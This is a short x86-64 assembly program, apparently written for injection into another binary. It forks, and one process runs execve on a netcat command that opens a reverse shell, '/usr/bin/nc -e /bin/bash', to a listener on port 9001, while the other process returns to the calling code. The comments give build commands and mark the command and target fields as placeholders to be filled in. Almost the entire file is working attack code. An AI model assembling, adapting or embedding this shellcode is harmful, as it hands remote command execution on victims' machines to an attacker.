DEFAULT REL

; nasm -f elf64 -o call_me.o call_me.asm -l call_me.assembly -O0
; ld -m elf_x86_64 -o call_me call_me.o

global _start

section .text

_start:

  mov  rbp, rsp; build stack
  sub  rsp, 0x48

  xor   rcx, rcx ; clear stack
  push  rcx

  mov  rax, 57 ; sys_fork
  syscall

  lea    rcx, [rel _child] ; move child address to rcx
  lea    rbx, [rel _parent] ; move parent address to rbx
  cmp    rax, 0 ; check if parent
  cmove  rcx, rbx ; conditional move rbx to rcx if parent
  jmp    rcx ; jump to rcx

_child:
  add  rsp, 0x48 ; break down stack
  mov  rsp, rbp
  ret ; return to program call

_parent:
  mov  rax, 59  ; execve

  lea   rcx, [rel arg4] ; push arguments
  push  rcx

  lea   rcx, [rel arg3] ; push arguments
  push  rcx

  lea   rcx, [rel arg2] ; push arguments
  push  rcx

  lea   rcx, [rel arg1] ; push arguments
  push  rcx

  lea   rcx, [rel arg0] ; push command
  push  rcx

  lea  rdi, [rel arg0] ; cmd
  lea  rsi, [rsp] ; args
  xor  rdx, rdx ; env
  syscall

; /usr/bin/nc -e /bin/bash 127.0.0.1 9001

arg0: db "/usr/bin/nc", 0 ; COMMAND GOES HERE
arg1: db "-e", 0 ; ARGUMENTS GO HERE
arg2: db "/bin/bash",0
arg3: db "127.0.0.1",0
arg4: db "9001",0




